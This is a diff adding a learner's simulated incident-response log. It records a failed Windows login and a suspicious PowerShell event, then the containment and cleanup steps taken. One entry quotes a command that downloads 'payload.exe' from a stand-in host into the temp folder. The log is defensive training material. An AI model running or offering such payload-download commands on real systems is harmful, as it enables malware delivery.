@@ -1,0 +1,42 @@
+===========================================
+🔍 INCIDENT RESPONSE LOG – DAY #11
+===========================================
+
+🧠 Incident 1: Failed Login Attempt
+-------------------------------------------
+• Event ID: 4625
+• Log Source: Windows Logs → Security
+• Timestamp: 2025-04-16 14:23:01
+• Username: BecomingCyber
+• Workstation: DESKTOP-BECOMING
+• IP Address: 127.0.0.1 (Local test)
+• Logon Type: 2 (Interactive – local login)
+• Outcome: Failure – invalid credentials
+• Notes: Simulated by locking screen and entering wrong password 3 times.
+
+🧠 Incident 2: Suspicious PowerShell Command
+-------------------------------------------
+• Event ID: 4104
+• Log Source: Apps & Services Logs → Microsoft → Windows → PowerShell → Operational
+• Timestamp: 2025-04-16 15:14:23
+• Username: Becom
+• Command Executed:
+  Invoke-WebRequest -Uri "http://example.com/payload.exe" -OutFile "$env:TEMP\payload.exe"
+• Outcome: Triggered script block logging (PowerShell Operational log)
+• Notes: The domain did not serve an actual file; simulated behavior.
+
+🧼 Response Actions Taken
+-------------------------------------------
+• Suspicious PowerShell process terminated via Task Manager
+• Dummy file payload.exe created in %TEMP% using New-Item
+• File removed successfully via:
+  Remove-Item "$env:TEMP\payload.exe"
+• Affected account: Becom
+• System Time of Action: 2025-04-16 15:20:18
+
+📌 Analyst Notes:
+- Both incidents simulated safely for training purposes.
+- Windows logs provided visibility into authentication failures and PowerShell usage.
+- Response playbook followed: detect → contain → clean → document.
+
+===========================================
